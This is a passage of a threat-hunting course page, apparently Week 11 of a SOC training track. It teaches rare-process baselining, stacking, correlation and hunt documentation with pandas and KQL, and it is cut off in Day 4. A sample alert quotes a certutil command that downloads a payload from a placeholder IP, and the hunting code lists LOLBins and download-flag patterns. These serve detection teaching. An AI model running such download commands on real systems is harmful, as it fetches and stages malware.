@@ -1,0 +1,720 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Week 11 — Advanced Query Engineering</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script></head>
+<body data-site="cyber">
+<header class="top"><div class="in">
+<a class="brand" href="index.html">Cyber Track</a>
+<a href="index.html">Weeks</a><a href="play.html">Playground</a><a href="../index.html">All sites</a>
+<span class="sp"></span><span class="prog" id="prog"></span>
+</div></header>
+<main>
+<h1>Week 11 — Advanced Query Engineering</h1><div class="toc"><a class="btn ghost" href="#day-1">Day 1</a><a class="btn ghost" href="#day-2">Day 2</a><a class="btn ghost" href="#day-3">Day 3</a><a class="btn ghost" href="#day-4">Day 4</a><a class="btn ghost" href="#day-5">Day 5</a></div><p class="note">Done this week: <span data-week-count="11" data-size="5"></span></p><p class="note">Code blocks run in your browser. <button class="ghost" id="resetpy" type="button">Reset Python session</button></p><h1>Week 11 — Advanced Query Engineering</h1>
+<h2>Metadata</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phase</td>
+<td>Phase 3 — Log Analysis &amp; SIEM</td>
+</tr>
+<tr>
+<td>Cert Alignment</td>
+<td>BTL1: Advanced log analysis / SC-200: Advanced KQL, hunting / GCIA: Behavioral analytics</td>
+</tr>
+<tr>
+<td>Royal Road</td>
+<td>Rare process behavioral detector (KQL or Pandas)</td>
+</tr>
+<tr>
+<td>Prerequisites</td>
+<td>W08 (Sysmon dataset), W09 (KQL fundamentals), W10 (Sigma, CI pipeline)</td>
+</tr>
+<tr>
+<td>Est. Hours</td>
+<td>8–10 hrs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="day-1">Day 1 — Behavioral Detection Fundamentals</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="11-1"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><p class="alt">Find a video: <a href="https://www.youtube.com/results?search_query=behavioral%20detection%20engineering%20rare%20process%20analysis%20SIEM%20hunting" target="_blank" rel="noopener">behavioral detection engineering rare process analysis SIEM hunting</a></p></div>
+<hr />
+<h3>Concept 1 — Signature vs. Behavioral Detection</h3>
+<p>Signature detection matches known bad indicators: file hashes, IP addresses, domain names. Behavioral detection identifies patterns of activity that deviate from a baseline regardless of specific indicators. Behavioral detection catches unknown threats; signature detection is faster and more precise for known threats.</p>
+<p>The spectrum:</p>
+<ul>
+<li><strong>Signature</strong>: <code>Image endswith '\mimikatz.exe'</code> — catches mimikatz by name</li>
+<li><strong>Behavioral</strong>: rare process spawning cmd.exe, running from temp dir, making network connections — catches any credential dumping tool that mimics mimikatz behavior without using the same name</li>
+</ul>
+<p>A signature that attackers bypass by renaming a binary stops working instantly. A behavioral rule based on what the process <em>does</em> survives the rename.</p>
+<p>Data engineering analogy: signature detection is a lookup against a known-bad table. Behavioral detection is an anomaly score calculated from distributions and baselines — the same shift from exact-match queries to statistical thresholds you see in data quality monitoring.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import pandas as pd
+
+# Signature approach — fails on renamed tool
+def detect_by_signature(df: pd.DataFrame) -&gt; pd.DataFrame:
+    return df[df[&quot;process_name&quot;] == &quot;mimikatz.exe&quot;]
+
+# Behavioral approach — survives rename
+def detect_by_behavior(df: pd.DataFrame) -&gt; pd.DataFrame:
+    suspicious = df[
+        # high integrity process
+        (df[&quot;IntegrityLevel&quot;] == &quot;High&quot;) &amp;
+        # spawned by office or script host
+        (df[&quot;parent_name&quot;].isin([&quot;winword.exe&quot;, &quot;powershell.exe&quot;, &quot;wscript.exe&quot;])) &amp;
+        # makes network connection (if net_connections column available)
+        (df.get(&quot;outbound_connections&quot;, pd.Series(0)) &gt; 0) &amp;
+        # runs from suspicious path
+        (df[&quot;Image&quot;].str.lower().str.contains(r&quot;\\temp\\|\\appdata\\&quot;, regex=True))
+    ]
+    return suspicious
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>compare_detection_approaches(df: pd.DataFrame, known_hashes: set[str]) -&gt; dict</code> that runs both a signature check (match on Hashes column) and a behavioral check (any of: is_temp_path=True, cmd_length&gt;200, parent in Office apps). Return <code>{&quot;signature_hits&quot;: N, &quot;behavioral_hits&quot;: M, &quot;both&quot;: K, &quot;behavioral_only&quot;: L}</code> — behavioral_only is the count of events caught by behavior but not signature.
+Expected output: dict showing behavioral detects threats that signature missed</p>
+<hr />
+<h3>Concept 2 — Establishing a Process Baseline</h3>
+<p>Behavioral detection requires a normal baseline. Without knowing what &quot;normal&quot; looks like, you can't define &quot;abnormal.&quot; A process baseline answers: which processes run, on which hosts, how often, launched by which parents?</p>
+<p>Baseline construction:</p>
+<ol>
+<li>Collect 7–30 days of Sysmon EventID 1 (ProcessCreate) data</li>
+<li>For each (host, process_name, parent_name) triple, count occurrences</li>
+<li>Processes appearing on fewer than N% of hosts or fewer than M times are &quot;rare&quot;</li>
+<li>Rarity is contextual: <code>schtasks.exe</code> running at midnight is normal; running 50 times in 1 hour from PowerShell is not</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def build_process_baseline(df: pd.DataFrame, lookback_days: int = 7) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;
+    Build a frequency baseline for (process_name, parent_name) pairs.
+    Returns baseline with occurrence counts and host coverage.
+    &quot;&quot;&quot;
+    cutoff = df[&quot;UtcTime&quot;].max() - pd.Timedelta(days=lookback_days)
+    baseline_df = df[df[&quot;UtcTime&quot;] &lt; cutoff].copy()
+    
+    baseline = (
+        baseline_df.groupby([&quot;process_name&quot;, &quot;parent_name&quot;])
+        .agg(
+            total_occurrences=(&quot;process_name&quot;, &quot;count&quot;),
+            unique_hosts=(&quot;User&quot;, &quot;nunique&quot;),   # proxy for host diversity
+        )
+        .reset_index()
+    )
+    baseline[&quot;occurrence_rank&quot;] = baseline[&quot;total_occurrences&quot;].rank(pct=True)
+    return baseline.sort_values(&quot;occurrence_rank&quot;)
+
+def flag_rare_processes(df: pd.DataFrame, baseline: pd.DataFrame, rarity_pct: float = 0.05) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;Flag processes in the rare tail (below rarity_pct percentile of occurrence).&quot;&quot;&quot;
+    rare_pairs = baseline[baseline[&quot;occurrence_rank&quot;] &lt;= rarity_pct][[&quot;process_name&quot;, &quot;parent_name&quot;]]
+    merged = df.merge(rare_pairs, on=[&quot;process_name&quot;, &quot;parent_name&quot;], how=&quot;inner&quot;)
+    return merged
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Using the Sysmon dataset from W08 (or the <code>SYSMON_SAMPLE</code> list), write <code>process_frequency_table(df: pd.DataFrame) -&gt; pd.DataFrame</code> that returns a table of all unique process_name values with: total count, count of unique parent processes that spawned it, count of unique users who ran it, first_seen, last_seen. Sort by total count ascending (rarest first).
+Expected output: DataFrame with 5 columns; rarest processes at the top</p>
+<hr />
+<h3>Concept 3 — Rare Process Detection Algorithm</h3>
+<p>The rare process detector works by comparing current activity against the baseline and flagging processes that:</p>
+<ol>
+<li>Are in the rare tail of the baseline distribution, OR</li>
+<li>Were never seen in the baseline at all (new process), OR</li>
+<li>Have a significantly higher frequency today than their baseline average</li>
+</ol>
+<p>This is the Pareto principle applied to security: 80% of attacks use processes that appear in the rarest 5% of your baseline.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from datetime import datetime, timedelta
+
+def rare_process_detector(
+    historical_df: pd.DataFrame,
+    current_df: pd.DataFrame,
+    rarity_threshold: float = 0.05,
+    new_process_flag: bool = True,
+) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;
+    Detect rare and new processes in current_df relative to historical_df.
+    Returns flagged records with a &#x27;detection_reason&#x27; column.
+    &quot;&quot;&quot;
+    baseline = build_process_baseline(historical_df)
+    rare_threshold_count = baseline[&quot;total_occurrences&quot;].quantile(rarity_threshold)
+    
+    rare_set = set(
+        baseline[baseline[&quot;total_occurrences&quot;] &lt;= rare_threshold_count][&quot;process_name&quot;].tolist()
+    )
+    known_processes = set(baseline[&quot;process_name&quot;].tolist())
+    
+    flags = []
+    for _, row in current_df.iterrows():
+        pname = row[&quot;process_name&quot;]
+        if pname not in known_processes:
+            flags.append({**row.to_dict(), &quot;detection_reason&quot;: &quot;new_process_never_seen&quot;})
+        elif pname in rare_set:
+            flags.append({**row.to_dict(), &quot;detection_reason&quot;: &quot;rare_process_in_baseline&quot;})
+    
+    return pd.DataFrame(flags) if flags else pd.DataFrame(columns=list(current_df.columns) + [&quot;detection_reason&quot;])
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Test <code>rare_process_detector</code> by splitting the W08 Sysmon dataset at the midpoint: first half = historical, second half = current. Add 2 synthetic rows to the current half with <code>process_name = &quot;totally_new_tool.exe&quot;</code>. Run the detector and verify: (1) the synthetic rows are flagged as <code>new_process_never_seen</code>, (2) the output has a <code>detection_reason</code> column.
+Expected output: at least 2 flagged records; synthetic process rows present with correct detection_reason</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can explain why a process is unusual given context about the environment.
+<strong>Threat:</strong> Behavioral baselines trained on data that includes pre-existing compromise will learn malicious activity as &quot;normal.&quot;
+<strong>Opportunity:</strong> When a rare process fires, enrich the alert with an LLM explanation: &quot;This process is rare because X. Known malicious uses include Y. Recommended investigation steps: Z.&quot;
+<strong>Prompt to try:</strong> <code>&quot;A detection fired for process 'certutil.exe' with parent 'powershell.exe' and command line 'certutil.exe -urlcache -split -f http://10.0.0.1/payload.exe'. This process appeared in 0.02% of our baseline. Explain: (1) why certutil is a LOLBin used for malware download, (2) what the specific command line does, (3) what investigation steps a tier-1 analyst should take, (4) the MITRE ATT&amp;CK technique and sub-technique.&quot;</code></p>
+<hr />
+<h2 id="day-2">Day 2 — Stacking and Correlation Queries</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="11-2"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=7q7GGg-Ws9s" target="_blank" rel="noopener"><b>Toppling the Stack: Outlier Detection for Threat Hunters - SANS Threat Hunting Summit 2017</b><small>SANS Digital Forensics and Incident Response</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=detection%20stacking%20correlation%20query%20SIEM%20threat%20hunting%20rare%20events" target="_blank" rel="noopener">detection stacking correlation query SIEM threat hunting rare events</a></p></div>
+<hr />
+<h3>Concept 1 — Stacking: Finding Low-Frequency Events</h3>
+<p>Stacking is a threat hunting technique that aggregates events by a key attribute and counts them, then sorts ascending to surface the rarest values. The insight: most attacks are low-frequency by definition — an attacker running a tool once stands out from a baseline of thousands of routine events.</p>
+<p>Stack everything: process names, parent-child pairs, command lines, destination ports, user-agent strings, DNS domains. The rarest items in each stack are hunting leads.</p>
+<p><strong>Example:</strong></p>
+<pre><code>// KQL — Stack process names, sort by rarity
+SecurityEvent
+| where EventID == 4688
+| where TimeGenerated &gt; ago(7d)
+| summarize process_count = count(), unique_hosts = dcount(Computer) by NewProcessName
+| sort by process_count asc
+| take 20
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def stack_by_field(df: pd.DataFrame, field: str, top_n: int = 20) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;Stack events by a field, return the rarest N values.&quot;&quot;&quot;
+    result = (
+        df.groupby(field)
+        .agg(
+            event_count=(field, &quot;count&quot;),
+            unique_users=(&quot;User&quot;, &quot;nunique&quot;) if &quot;User&quot; in df.columns else (field, &quot;count&quot;),
+        )
+        .reset_index()
+        .sort_values(&quot;event_count&quot;)
+        .head(top_n)
+    )
+    return result
+
+# Stack parent-child process pairs
+def stack_parent_child(df: pd.DataFrame, top_n: int = 20) -&gt; pd.DataFrame:
+    df[&quot;pair&quot;] = df[&quot;parent_name&quot;] + &quot; → &quot; + df[&quot;process_name&quot;]
+    return stack_by_field(df, &quot;pair&quot;, top_n)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>multi_stack_report(df: pd.DataFrame) -&gt; dict[str, pd.DataFrame]</code> that runs stacking on 4 fields: <code>process_name</code>, <code>parent_name</code>, a computed <code>parent_child_pair</code>, and <code>CommandLine</code> (top 10 rarest for each). Return a dict of field → DataFrame. For CommandLine stacking, truncate to first 80 chars to avoid uniqueness explosion.
+Expected output: dict with 4 keys; each value is a DataFrame sorted rarity ascending</p>
+<hr />
+<h3>Concept 2 — Temporal Correlation</h3>
+<p>Temporal correlation detects sequences of events that occur within a time window. A single 4625 (failed logon) is noise. Ten 4625 events followed by a 4624 (success) within 5 minutes is a successful brute force.</p>
+<p>Patterns to correlate:</p>
+<ul>
+<li>Failed logons → success (brute force succeeding)</li>
+<li>Process create → network connect → DNS query (malware C2 setup)</li>
+<li>File create → process create from same path (dropper + execution)</li>
+<li>Account create → group add → logon (new admin account lateral movement)</li>
+</ul>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def correlate_brute_force_success(df: pd.DataFrame, window_minutes: int = 5) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;
+    Find accounts where: &gt;= 5 failed logons followed by a success within N minutes.
+    &quot;&quot;&quot;
+    failures = df[df[&quot;EventID&quot;] == 4625][[&quot;TimeGenerated&quot;, &quot;Account&quot;, &quot;IpAddress&quot;]].copy()
+    successes = df[df[&quot;EventID&quot;] == 4624][[&quot;TimeGenerated&quot;, &quot;Account&quot;, &quot;IpAddress&quot;]].copy()
+    
+    alerts = []
+    for account in failures[&quot;Account&quot;].unique():
+        acct_failures = failures[failures[&quot;Account&quot;] == account].sort_values(&quot;TimeGenerated&quot;)
+        acct_successes = successes[successes[&quot;Account&quot;] == account]
+        
+        for _, success_row in acct_successes.iterrows():
+            window_start = success_row[&quot;TimeGenerated&quot;] - pd.Timedelta(minutes=window_minutes)
+            prior_failures = acct_failures[
+                (acct_failures[&quot;TimeGenerated&quot;] &gt;= window_start) &amp;
+                (acct_failures[&quot;TimeGenerated&quot;] &lt; success_row[&quot;TimeGenerated&quot;])
+            ]
+            if len(prior_failures) &gt;= 5:
+                alerts.append({
+                    &quot;account&quot;: account,
+                    &quot;success_time&quot;: success_row[&quot;TimeGenerated&quot;],
+                    &quot;failure_count&quot;: len(prior_failures),
+                    &quot;source_ip&quot;: success_row[&quot;IpAddress&quot;],
+                })
+    return pd.DataFrame(alerts)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>detect_execution_chain(df: pd.DataFrame, window_minutes: int = 2) -&gt; pd.DataFrame</code> that finds Sysmon events where: EventID=1 (process create) is followed within N minutes by EventID=3 (network connect) for the same ProcessId. Return the correlated pairs with columns: create_time, connect_time, Image, CommandLine, dest_ip.
+Expected output: DataFrame with process create + network connect pairs for same PID within time window</p>
+<hr />
+<h3>Concept 3 — Entity-Based Correlation</h3>
+<p>Entity-based correlation pivots on an entity (user, host, IP) and aggregates all suspicious activity for that entity across event types. A single event rarely tells a full story; multiple low-severity events targeting the same entity compose into a high-confidence alert.</p>
+<p>Risk scoring: assign point values to individual events, sum by entity over a time window, alert when the entity exceeds a threshold.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>RISK_WEIGHTS = {
+    &quot;failed_logon&quot;: 1,
+    &quot;successful_logon_from_new_ip&quot;: 5,
+    &quot;rare_process_execution&quot;: 3,
+    &quot;process_from_temp&quot;: 2,
+    &quot;encoded_powershell&quot;: 4,
+    &quot;outbound_to_rare_domain&quot;: 3,
+}
+
+def entity_risk_score(events_by_entity: dict[str, list[str]]) -&gt; dict[str, int]:
+    &quot;&quot;&quot;
+    events_by_entity: {entity_name: [list of event_type strings]}
+    Returns {entity_name: total_risk_score}
+    &quot;&quot;&quot;
+    scores = {}
+    for entity, event_types in events_by_entity.items():
+        score = sum(RISK_WEIGHTS.get(et, 0) for et in event_types)
+        scores[entity] = score
+    return dict(sorted(scores.items(), key=lambda x: x[1], reverse=True))
+
+sample = {
+    &quot;jsmith&quot;: [&quot;failed_logon&quot;, &quot;failed_logon&quot;, &quot;successful_logon_from_new_ip&quot;, &quot;rare_process_execution&quot;],
+    &quot;svc_backup&quot;: [&quot;successful_logon_from_new_ip&quot;],
+    &quot;admin&quot;: [&quot;failed_logon&quot;],
+}
+print(entity_risk_score(sample))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>build_entity_timeline(df: pd.DataFrame, entity_field: str, time_window_hours: int = 24) -&gt; dict</code> that groups events by the entity field, builds a chronological list of (timestamp, event_description) tuples per entity, and computes a risk score using <code>entity_risk_score</code>. Return <code>{entity: {&quot;timeline&quot;: [...], &quot;risk_score&quot;: N}}</code> for all entities with risk_score &gt; 0.
+Expected output: dict where each entity has a sorted timeline and a numeric risk score</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs excel at narrative synthesis — turning a list of correlated events into a readable attack story.
+<strong>Threat:</strong> Correlation rules that fire on normal multi-step workflows create alert fatigue — developers doing deployment, IT running maintenance scripts.
+<strong>Opportunity:</strong> Feed an entity timeline to an LLM: &quot;Given this sequence of events for user jsmith, write a one-paragraph incident summary describing what likely happened and whether it warrants escalation.&quot;
+<strong>Prompt to try:</strong> <code>&quot;Here is a 24-hour event timeline for user jsmith (JSON array of timestamp + event_type). Synthesize a one-paragraph incident narrative. Classify as: True Positive (attack likely), Investigation Needed (ambiguous), or False Positive (likely benign). Cite the specific events that drove your classification.&quot;</code></p>
+<hr />
+<h2 id="day-3">Day 3 — Threat Hunting Techniques</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="11-3"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=tSraChPEL7E" target="_blank" rel="noopener"><b>Threat Hunting 101: Fantastic Hypothesis and Where to Find (or Build) Them</b><small>THOR-HQ</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=threat%20hunting%20SIEM%20hypothesis%20driven%20detection%20KQL%20Splunk%20SOC" target="_blank" rel="noopener">threat hunting SIEM hypothesis driven detection KQL Splunk SOC</a></p></div>
+<hr />
+<h3>Concept 1 — The Hunting Loop</h3>
+<p>Threat hunting is the proactive search for threats that have evaded existing detection rules. The process is hypothesis-driven: you start with a threat model or CTI (from W07), form a hypothesis about attacker behavior, then search for evidence.</p>
+<p>The hunting loop:</p>
+<ol>
+<li><strong>Form hypothesis</strong> — &quot;Attackers using PowerShell download cradles to stage payloads&quot;</li>
+<li><strong>Identify observables</strong> — what log events would this produce?</li>
+<li><strong>Write the hunt query</strong> — KQL/SPL/pandas to find the pattern</li>
+<li><strong>Investigate results</strong> — review hits manually, determine true/false positive</li>
+<li><strong>Convert to detection</strong> — if the hypothesis holds, write a Sigma rule for continuous monitoring</li>
+<li><strong>Document findings</strong> — even negative hunts are valuable (confirms no evidence of technique)</li>
+</ol>
+<p>Data engineering analogy: hunting is exploratory analysis (pandas, notebooks, ad-hoc SQL). Detection rules are the productionized version (scheduled queries, CI pipeline, Sentinel).</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Hypothesis: attackers use certutil to download payloads
+# Observable: certutil.exe with -urlcache or -decode flags
+
+def hunt_certutil_download(df: pd.DataFrame) -&gt; pd.DataFrame:
+    certutil = df[df[&quot;process_name&quot;] == &quot;certutil.exe&quot;].copy()
+    download_flags = certutil[&quot;CommandLine&quot;].str.lower().str.contains(
+        r&quot;-urlcache|-decode|-encode&quot;, regex=True, na=False
+    )
+    return certutil[download_flags][
+        [&quot;UtcTime&quot;, &quot;User&quot;, &quot;CommandLine&quot;, &quot;parent_name&quot;, &quot;Image&quot;]
+    ].sort_values(&quot;UtcTime&quot;)
+
+def hunt_lolbin_network(df: pd.DataFrame, lolbins: list[str]) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;Find LOLBins (living-off-the-land binaries) making network connections.&quot;&quot;&quot;
+    lolbin_events = df[df[&quot;process_name&quot;].isin(lolbins)]
+    return lolbin_events[
+        lolbin_events.get(&quot;has_network_connection&quot;, pd.Series(False, index=lolbin_events.index))
+    ]
+
+LOLBINS = [&quot;certutil.exe&quot;, &quot;bitsadmin.exe&quot;, &quot;mshta.exe&quot;, &quot;regsvr32.exe&quot;, &quot;rundll32.exe&quot;, &quot;msiexec.exe&quot;]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>hunt_suspicious_parents(df: pd.DataFrame, office_apps: list[str], shell_procs: list[str]) -&gt; pd.DataFrame</code> that finds all process creation events where an office application spawned a shell/script interpreter. Return the results with columns: UtcTime, parent_name, process_name, CommandLine, User. This is the hypothesis: &quot;Attackers use malicious macros to spawn shells.&quot;
+Expected output: DataFrame of office→shell spawn events; empty DataFrame if no matches in test data</p>
+<hr />
+<h3>Concept 2 — Data-Driven Hunting with Frequency Analysis</h3>
+<p>Not all hunts start with a hypothesis. Frequency analysis generates hunting leads by surfacing statistically unusual patterns in the data — you let the data tell you what's strange, then investigate.</p>
+<p>Techniques:</p>
+<ul>
+<li><strong>Command line clustering</strong> — group similar command lines; outlier clusters contain unusual executions</li>
+<li><strong>Edit distance</strong> — processes with names similar to system processes (svchost.exe → svchost0.exe)</li>
+<li><strong>Port/protocol rarity</strong> — connections on unusual ports</li>
+<li><strong>User-host affinity</strong> — users logging into hosts they've never accessed before</li>
+</ul>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def typosquatting_detector(df: pd.DataFrame, system_processes: list[str]) -&gt; pd.DataFrame:
+    &quot;&quot;&quot;
+    Detect process names that are similar to (but not exactly) known system processes.
+    Uses simple edit distance: flag processes within Levenshtein distance 1 or 2.
+    &quot;&quot;&quot;
+    def levenshtein(s1: str, s2: str) -&gt; int:
+        if len(s1) &lt; len(s2):
+            return levenshtein(s2, s1)
+        if not s2:
+            return len(s1)
+        prev = list(range(len(s2) + 1))
+        for i, c1 in enumerate(s1):
+            curr = [i + 1]
+            for j, c2 in enumerate(s2):
+                curr.append(min(prev[j+1]+1, curr[j]+1, prev[j]+(c1 != c2)))
+            prev = curr
+        return prev[-1]
+    
+    suspects = []
+    for _, row in df.drop_duplicates(&quot;process_name&quot;).iterrows():
+        pname = row[&quot;process_name&quot;].lower()
+        for sys_proc in system_processes:
+            if pname != sys_proc and levenshtein(pname, sys_proc) &lt;= 2:
+                suspects.append({**row.to_dict(), &quot;similar_to&quot;: sys_proc, &quot;edit_distance&quot;: levenshtein(pname, sys_proc)})
+                break
+    return pd.DataFrame(suspects)
+
+SYSTEM_PROCS = [&quot;svchost.exe&quot;, &quot;lsass.exe&quot;, &quot;explorer.exe&quot;, &quot;services.exe&quot;, &quot;winlogon.exe&quot;]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>frequency_anomaly_hunt(df: pd.DataFrame, field: str, z_score_threshold: float = 2.0) -&gt; pd.DataFrame</code> that calculates the mean and standard deviation of event count per value of <code>field</code> (after grouping by field + hour_bucket). Flag field values where count in the most recent hour exceeds mean + z_score_threshold * std. Return flagged entries with zscore column.
+Expected output: DataFrame of unusual field values with their z-scores; empty if no anomalies</p>
+<hr />
+<h3>Concept 3 — Documenting Hunt Findings</h3>
+<p>Hunts must be documented even when negative. A documented negative hunt is evidence that a technique was searched for and not found — valuable for security posture reporting. A positive hunt finding documents the attack chain that was missed and becomes the basis for a new detection rule.</p>
+<p>Hunt documentation format:</p>
+<pre><code>Hunt ID: HUNT-2024-003
+Hypothesis: PowerShell download cradle via IEX + Net.WebClient
+Date: 2024-03-15
+Analyst: [name]
+Data sources: Sysmon EventID 1, 3 (30 days)
+Hunt query: [KQL or Python function]
+Results: 3 hits found
+Classification: True Positive (confirmed via IR)
+Outcome: New Sigma rule created: rules/execution/powershell_iex_download.yml
+</code></pre><p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+from datetime import date
+
+@dataclass
+class HuntReport:
+    hunt_id: str
+    hypothesis: str
+    hunt_date: date
+    analyst: str
+    data_sources: list[str]
+    query_description: str
+    result_count: int
+    classification: str    # &quot;true_positive&quot; | &quot;false_positive&quot; | &quot;negative&quot; | &quot;inconclusive&quot;
+    outcome: str
+    related_techniques: list[str] = field(default_factory=list)
+    rule_created: str = &quot;&quot;
+
+    def to_markdown(self) -&gt; str:
+        tp_label = &quot;TP&quot; if self.classification == &quot;true_positive&quot; else self.classification.upper()
+        lines = [
+            f&quot;## {self.hunt_id} — {self.hypothesis}&quot;,
+            f&quot;**Date**: {self.hunt_date} | **Analyst**: {self.analyst} | **Result**: {tp_label}&quot;,
+            f&quot;**Data sources**: {&#x27;, &#x27;.join(self.data_sources)}&quot;,
+            f&quot;**Hits**: {self.result_count}&quot;,
+            f&quot;**Outcome**: {self.outcome}&quot;,
+        ]
+        if self.rule_created:
+            lines.append(f&quot;**Rule**: `{self.rule_created}`&quot;)
+        return &quot;\n&quot;.join(lines)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>generate_hunt_backlog(coverage: list[dict], recent_cti: list[str]) -&gt; list[HuntReport]</code> that takes your ATT&amp;CK coverage dict (from W10) and a list of technique IDs from recent CTI (e.g., <code>[&quot;T1055&quot;, &quot;T1027&quot;, &quot;T1070.001&quot;]</code>), and generates one <code>HuntReport</code> stub for each technique that is in <code>recent_cti</code> but has status <code>&quot;gap&quot;</code> in the coverage. Set classification to <code>&quot;negative&quot;</code> (not yet hunted), result_count to 0.
+Expected output: list of HuntReport objects for prioritized gap techniques</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can generate hunt hypotheses from threat intelligence reports automatically.
+<strong>Threat:</strong> Hunt hypotheses generated without analyst review may focus on well-known techniques while missing novel TTPs specific to your environment.
+<strong>Opportunity:</strong> Feed a CTI report (from W07) to an LLM: &quot;Extract all attacker behaviors described in this report and generate one hunt hypothesis per behavior, formatted for our hunt tracking system.&quot;
+<strong>Prompt to try:</strong> <code>&quot;Read this threat intelligence report excerpt. For each attacker behavior described: (1) identify the MITRE ATT&amp;CK technique, (2) write a hunt hypothesis in 'attacker does X using Y to achieve Z' format, (3) suggest the log source and key fields to search, (4) write a Python pandas filter expression. Output as a JSON array.&quot;</code></p>
+<hr />
+<h2 id="day-4">Day 4 — KQL for Large-Scale Detection</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="11-4"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=NZTPLHgvYgo" target="_blank" rel="noopener"><b>Azure Sentinel webinar: Optimizing KQL queries performance (Part 3 of 3)</b><small>Microsoft Security</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=KQL%20optimization%20performance%20large%20scale%20Sentinel%20Microsoft%20query%20tuning" target="_blank" rel="noopener">KQL optimization performance large scale Sentinel Microsoft query tuning</a></p></div>
+<hr />
+<h3>Concept 1 — KQL Query Optimization</h3>
+<p>KQL queries on production SIEM data run against billions of rows. Poorly written queries time out or consume excessive resources. Optimization principles:</p>
+<ol>
+<li><strong>Filter early</strong> — put <code>where TimeGenerated &gt; ago(24h)</code> first; this is the most powerful filter</li>
+<li><strong>Use <code>has</code> not <code>contains</code></strong> — <code>has</code> matches word boundaries and is faster for whole words</li>
+<li><strong>Avoid regex when string operators suffice</strong> — <code>contains</code> is faster than <code>matches regex</code> for simple patterns</li>
+<li><strong>Use <code>in</code> for multiple values</strong> — <code>where EventID in (4624, 4625, 4688)</code> is faster than three separate <code>or</code> conditions</li>
+<li><strong>Reduce columns early</strong> — <code>project</code> after <code>where</code>, before <code>join</code>, to reduce data volume</li>
+<li><strong>Limit join right-side size</strong> — join to small lookup tables, not large event tables</li>
+<li><strong>Use <code>materialize()</code></strong> — for repeated sub-queries, <code>let t = materialize(...)</code> caches the result</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Python analogy: pandas optimization patterns that mirror KQL optimization
+
